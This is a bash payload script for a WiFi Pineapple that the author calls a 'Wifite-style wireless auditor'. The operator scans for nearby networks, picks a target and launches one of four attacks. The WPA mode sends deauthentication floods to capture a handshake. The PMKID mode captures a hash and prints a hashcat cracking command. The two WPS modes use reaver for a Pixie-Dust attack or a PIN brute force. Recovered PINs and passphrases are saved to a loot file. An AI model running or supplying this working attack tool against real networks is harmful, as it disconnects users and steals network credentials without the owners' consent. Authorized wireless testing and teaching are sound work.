#!/bin/bash
# Title: PineFite
# Description: Wifite-style wireless auditor - scan, select, and attack WiFi targets
# Author: wickedNull
# Version: 1.0
# Category: Reconnaissance

LOOT_DIR="/root/loot/pinefite"
mkdir -p "$LOOT_DIR"
export PATH="/mmc/usr/sbin:/mmc/usr/bin:$PATH"
export LD_LIBRARY_PATH="/mmc/usr/lib:/mmc/lib:$LD_LIBRARY_PATH"

log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOOT_DIR/pinefite.log"; }

# ── INTRO ─────────────────────────────────────────────────────────
PROMPT "PINEFITE v1.0

     by wickedNull

Wifite-style wireless auditor.
FOR AUTHORIZED USE ONLY.

Attack modes:
1. WPA Handshake capture
2. PMKID (clientless)
3. WPS Pixie-Dust
4. WPS PIN brute-force

Press OK to continue."

case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;;
esac

# ── SELECT ATTACK MODE ────────────────────────────────────────────
MODE=$(NUMBER_PICKER "Attack mode (1-4):
1=WPA  2=PMKID
3=WPS-Pixie  4=WPS-PIN" 1)

case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;;
esac
[ "$MODE" -lt 1 ] && MODE=1
[ "$MODE" -gt 4 ] && MODE=4

# ── DETECT MONITOR INTERFACE ─────────────────────────────────────
# Prefer wlan1mon — on the Pineapple wlan1 is the dedicated attack radio
MON_IF=""
for iface in wlan1mon wlan0mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && { MON_IF="$iface"; break; }
done

if [ -z "$MON_IF" ]; then
    SPINNER_START "Setting up monitor mode..."
    for base in wlan1 wlan0 wlan2; do
        if [ -d "/sys/class/net/$base" ]; then
            iw dev "$base" interface add "${base}mon" type monitor 2>/dev/null
            ip link set "${base}mon" up 2>/dev/null
            if [ -d "/sys/class/net/${base}mon" ]; then
                MON_IF="${base}mon"; break
            fi
            if command -v airmon-ng >/dev/null 2>&1; then
                airmon-ng start "$base" 2>/dev/null
                [ -d "/sys/class/net/${base}mon" ] && { MON_IF="${base}mon"; break; }
            fi
        fi
    done
    SPINNER_STOP
fi

if [ -z "$MON_IF" ]; then
    ERROR_DIALOG "Monitor mode failed!

Could not find or create a
monitor interface."
    exit 1
fi

log "Monitor interface: $MON_IF"
LOG green "Interface: $MON_IF"

# ── SCAN ──────────────────────────────────────────────────────────
LOG blue "Scanning on $MON_IF (~20s)..."
SPINNER_START "Scanning WiFi networks..."

rm -f /tmp/pw_scan*
airodump-ng "$MON_IF" -w /tmp/pw_scan --output-format csv 2>>"$LOOT_DIR/pinefite.log" &
SCAN_PID=$!
sleep 20
kill $SCAN_PID 2>/dev/null
wait $SCAN_PID 2>/dev/null
killall airodump-ng 2>/dev/null

SPINNER_STOP

# Find the CSV — airodump appends -01 suffix
CSV_FILE="/tmp/pw_scan-01.csv"
[ ! -f "$CSV_FILE" ] && [ -f "/tmp/pw_scan.csv" ] && CSV_FILE="/tmp/pw_scan.csv"

if [ ! -f "$CSV_FILE" ]; then
    log "ERROR: scan CSV not created by airodump-ng"
    ERROR_DIALOG "Scan failed!

airodump-ng wrote no output.
Interface: $MON_IF

Check: $LOOT_DIR/pinefite.log"
    exit 1
fi

log "Parsing $CSV_FILE ($(wc -l < "$CSV_FILE") lines)"

# Parse — skip headers, stop at client section
declare -a BSSIDS CHANNELS ESSIDS POWERS ENCS
idx=0
while IFS=',' read -r bssid first last channel speed priv cipher auth power beacons iv lan id essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    [[ "$bssid" == "Station MAC" ]] && break
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    essid=$(echo "$essid" | tr -d ' ' | cut -c1-18)
    [ -z "$essid" ] && essid="Hidden"
    channel=$(echo "$channel" | tr -d ' ')
    power=$(echo "$power" | tr -d ' ')
    enc=$(echo "$priv" | tr -d ' ')
    BSSIDS[$idx]="$bssid"
    CHANNELS[$idx]="$channel"
    ESSIDS[$idx]="$essid"
    POWERS[$idx]="$power"
    ENCS[$idx]="$enc"
    log "AP $idx: $essid $bssid ch$channel $power dB $enc"
    idx=$((idx + 1))
    [ $idx -ge 15 ] && break
done < "$CSV_FILE"

log "Parsed $idx networks"

if [ $idx -eq 0 ]; then
    ERROR_DIALOG "No networks found!

Scanned on: $MON_IF
CSV exists but 0 APs parsed.

Check: $LOOT_DIR/pinefite.log"
    exit 1
fi

# Show network list
NET_LIST="Found $idx networks:
"
for i in $(seq 0 $((idx-1))); do
    NET_LIST="${NET_LIST}
$((i+1)). ${ESSIDS[$i]} ${POWERS[$i]}dB ${ENCS[$i]}"
done

PROMPT "$NET_LIST

Press OK to select target."
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;;
esac

# ── SELECT TARGET ─────────────────────────────────────────────────
TARGET_NUM=$(NUMBER_PICKER "Select network (1-$idx):" 1)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;;
esac
[ "$TARGET_NUM" -lt 1 ] && TARGET_NUM=1
[ "$TARGET_NUM" -gt "$idx" ] && TARGET_NUM=$idx
TARGET_IDX=$((TARGET_NUM - 1))

TARGET_BSSID="${BSSIDS[$TARGET_IDX]}"
TARGET_CH="${CHANNELS[$TARGET_IDX]}"
TARGET_ESSID="${ESSIDS[$TARGET_IDX]}"

log "Target: $TARGET_ESSID ($TARGET_BSSID) ch$TARGET_CH mode=$MODE"

# ── CONFIRM ───────────────────────────────────────────────────────
resp=$(CONFIRMATION_DIALOG "Confirm Attack

Target: $TARGET_ESSID
BSSID:  $TARGET_BSSID
Ch:     $TARGET_CH
Mode:   $MODE

Select YES to proceed.")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;;
esac
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

CAPTURE_BASE="$LOOT_DIR/${TARGET_ESSID}_$(date +%Y%m%d_%H%M%S)"

# ── ATTACK ────────────────────────────────────────────────────────
case "$MODE" in

1) # WPA Handshake
    DURATION=$(NUMBER_PICKER "Capture duration (sec):" 60)
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac
    [ "$DURATION" -lt 10 ] && DURATION=10
    [ "$DURATION" -gt 300 ] && DURATION=300

    LOG blue "Capturing handshake..."
    iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null

    airodump-ng "$MON_IF" --bssid "$TARGET_BSSID" -c "$TARGET_CH" \
        -w "$CAPTURE_BASE" --output-format pcap 2>/dev/null &
    DUMP_PID=$!
    sleep 3

    HS_FOUND="No"
    START=$(date +%s)
    while [ $(($(date +%s) - START)) -lt "$DURATION" ]; do
        aireplay-ng -0 5 -a "$TARGET_BSSID" "$MON_IF" 2>/dev/null
        sleep 5
        if [ -f "${CAPTURE_BASE}-01.cap" ]; then
            aircrack-ng "${CAPTURE_BASE}-01.cap" 2>/dev/null | grep -q "1 handshake" && {
                HS_FOUND="Yes"
                ALERT "Handshake captured!"
                break
            }
        fi
    done

    kill $DUMP_PID 2>/dev/null
    killall airodump-ng aireplay-ng 2>/dev/null

    PROMPT "WPA Attack Complete

Target:    $TARGET_ESSID
Handshake: $HS_FOUND
Saved:     $CAPTURE_BASE

Press OK to exit."
    log "WPA complete. Handshake=$HS_FOUND"
    ;;

2) # PMKID
    if ! command -v hcxdumptool >/dev/null 2>&1; then
        ERROR_DIALOG "hcxdumptool not found!

Install:
opkg update
opkg install -d mmc hcxdumptool"
        exit 1
    fi

    LOG blue "Running PMKID attack..."
    SPINNER_START "Capturing PMKID (~30s)..."

    echo "$TARGET_BSSID" | tr -d ':' > /tmp/pw_filter.txt
    timeout 30 hcxdumptool -i "$MON_IF" \
        --filterlist_ap=/tmp/pw_filter.txt \
        --filtermode=2 \
        -o "${CAPTURE_BASE}.pcapng" 2>/dev/null

    SPINNER_STOP

    PMKID_FOUND="No"
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        hcxpcapngtool -o "${CAPTURE_BASE}.22000" "${CAPTURE_BASE}.pcapng" 2>/dev/null
        [ -s "${CAPTURE_BASE}.22000" ] && PMKID_FOUND="Yes"
    fi

    PROMPT "PMKID Attack Complete

Target: $TARGET_ESSID
PMKID:  $PMKID_FOUND
Saved:  $CAPTURE_BASE

Crack on PC:
hashcat -m 22000 hash.22000 list.txt

Press OK to exit."
    log "PMKID complete. Found=$PMKID_FOUND"
    ;;

3) # WPS Pixie-Dust
    if ! command -v reaver >/dev/null 2>&1; then
        ERROR_DIALOG "reaver not found!

Install:
opkg update
opkg install -d mmc reaver"
        exit 1
    fi

    LOG blue "Running WPS Pixie-Dust..."
    SPINNER_START "Pixie-Dust attack (~90s)..."

    RESULT=$(timeout 90 reaver -i "$MON_IF" -b "$TARGET_BSSID" \
        -c "$TARGET_CH" -K 1 -N -q 2>&1)

    SPINNER_STOP

    PIN=$(echo "$RESULT" | grep -o "WPS PIN: '[^']*'" | head -1)
    PSK=$(echo "$RESULT" | grep -o "WPA PSK: '[^']*'" | head -1)
    [ -n "$PSK" ] && {
        echo "$TARGET_ESSID|$TARGET_BSSID|$PIN|$PSK" >> "$LOOT_DIR/cracked.txt"
        ALERT "WPS cracked!"
    }

    PROMPT "WPS Pixie-Dust Complete

Target: $TARGET_ESSID
${PIN:-PIN: not found}
${PSK:-PSK: not found}

Press OK to exit."
    log "Pixie-Dust complete. PIN=$PIN PSK=$PSK"
    ;;

4) # WPS PIN
    if ! command -v reaver >/dev/null 2>&1; then
        ERROR_DIALOG "reaver not found!

Install:
opkg update
opkg install -d mmc reaver"
        exit 1
    fi

    LOG blue "Running WPS PIN brute-force..."
    LOG "This may take hours. Long press RED to cancel."

    reaver -i "$MON_IF" -b "$TARGET_BSSID" \
        -c "$TARGET_CH" -N -vv 2>&1 | \
    while IFS= read -r line; do
        echo "$line" | grep -qE "WPS PIN|WPA PSK|% complete" && LOG "$line"
        echo "$line" >> "$LOOT_DIR/reaver_${TARGET_ESSID}.log"
    done

    PROMPT "WPS PIN Complete

Log saved to:
$LOOT_DIR/reaver_${TARGET_ESSID}.log

Press OK to exit."
    log "WPS PIN complete."
    ;;
esac

# ── CLEANUP ───────────────────────────────────────────────────────
rm -f /tmp/pw_scan* /tmp/pw_filter.txt
iw dev "$MON_IF" info 2>/dev/null | grep -q "type monitor" && \
    iw dev "$MON_IF" del 2>/dev/null

log "Done."
